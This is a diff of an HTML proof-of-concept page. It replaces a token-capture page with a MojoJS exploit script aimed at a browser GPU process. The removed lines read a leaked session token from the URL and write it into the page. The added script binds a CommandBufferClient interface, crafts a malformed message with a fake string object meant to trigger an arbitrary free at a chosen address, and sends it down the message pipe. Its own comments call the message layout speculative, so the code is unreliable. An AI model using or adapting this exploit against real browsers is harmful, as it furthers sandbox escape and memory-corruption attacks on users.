@@ -1,14 +1,108 @@
 <!DOCTYPE html>
 <html>
-<head><title>PoC Leak</title></head>
+<head><title>Arbitrary Free PoC</title></head>
 <body>
-    <h1>Capture Page</h1>
-    <script>
-        // In a real attack, you'd send this to your server logs
-        const urlParams = new URLSearchParams(window.location.search);
-        const leakedData = urlParams.get('token');
-        console.log("Leaked Data captured: " + leakedData);
-        document.write("<h2>Captured Session Info:</h2><p>" + leakedData + "</p>");
-    </script>
+<h1>Testing Arbitrary Free in GPU Process</h1>
+<script>
+// Step 1: Obtain the Mojo interface
+async function getCommandBufferClient() {
+  try {
+    // The exact name might vary; use 'gpu.mojom.CommandBufferClient' as found in the binary
+    const clientPtr = await Mojo.bindInterface('gpu.mojom.CommandBufferClient');
+    console.log('Successfully bound to CommandBufferClient');
+    return clientPtr;
+  } catch (e) {
+    console.error('Failed to bind interface:', e);
+    // If it fails, you may need to find the correct interface name
+    // Try 'viz.mojom.Gpu' or other related names
+    return null;
+  }
+}
+
+// Step 2: Craft the malicious message
+function craftArbitraryFreeMessage(targetAddress, fakeSize) {
+  // This is a simplified example. You'll need to adjust based on the exact serialization format.
+  // The structure should:
+  // 1. Set ordinal to 0 (Initialize)
+  // 2. Provide offsets that cause the out-of-bounds read we analyzed
+  // 3. Point to a controlled area that mimics a string object with high bit set
+  
+  // Create a buffer to hold the malicious message
+  const buffer = new ArrayBuffer(256);
+  const view = new DataView(buffer);
+  
+  // --- Outer Message Header ---
+  // This part is speculative and needs to match the exact Mojo message format
+  // Offset 0: ordinal (uint32) -> 0 for Initialize
+  view.setUint32(0, 0, true);
+  
+  // Offset 4: count/flag that triggers the 'lVar5' path (set to 2)
+  view.setUint32(4, 2, true);
+  
+  // Offset 8: first offset to point to controlled data area (e.g., 16)
+  view.setUint32(8, 16, true);
+  
+  // --- Controlled Data Area (at offset 16) ---
+  // This is where we craft the fake string object that will be freed
+  // First 8 bytes: pointer to free (local_30)
+  // We'll set this to an address we want to free (e.g., 0x4141414141414141)
+  const targetPtrLow = targetAddress & 0xFFFFFFFF;
+  const targetPtrHigh = (targetAddress >> 32) & 0xFFFFFFFF;
+  view.setUint32(16, targetPtrLow, true);
+  view.setUint32(20, targetPtrHigh, true);
+  
+  // Next 8 bytes: size (local_28) - can be arbitrary
+  view.setUint32(24, 0x100, true);
+  view.setUint32(28, 0x0, true);
+  
+  // Last 8 bytes: capacity (local_20) - HIGH BIT MUST BE SET
+  // We set the high bit to trigger the free, and the rest is the size argument
+  const capacityHigh = 0x80000000; // High bit set
+  const capacityLow = fakeSize & 0x7FFFFFFF; // Size for free
+  view.setUint32(32, capacityLow, true);
+  view.setUint32(36, capacityHigh, true);
+  
+  return buffer;
+}
+
+// Step 3: Send the malicious message
+async function triggerExploit() {
+  const client = await getCommandBufferClient();
+  if (!client) {
+    console.error('No client interface available');
+    return;
+  }
+  
+  // The address we want to free (example: 0xdeadbeef)
+  const targetAddress = 0xdeadbeef;
+  const fakeSize = 0x100;
+  
+  // Craft the message
+  const maliciousPayload = craftArbitraryFreeMessage(targetAddress, fakeSize);
+  
+  // Now we need to send this raw message. In MojoJS, we can use:
+  // client.ptr.sendMessage(maliciousPayload);
+  // However, the exact API might be different.
+  // If there's no direct sendMessage, we might need to use the internal Mojo API.
+  
+  try {
+    // Attempt to send the raw message via the Mojo interface
+    // This might require accessing the underlying message pipe
+    const handle = client.ptr.getHandle();
+    if (handle) {
+      // Write the message to the pipe
+      handle.writeMessage(maliciousPayload, []);
+      console.log('Message sent!');
+    } else {
+      console.error('No handle available');
+    }
+  } catch (e) {
+    console.error('Failed to send message:', e);
+  }
+}
+
+// Run the exploit
+triggerExploit();
+</script>
 </body>
 </html>
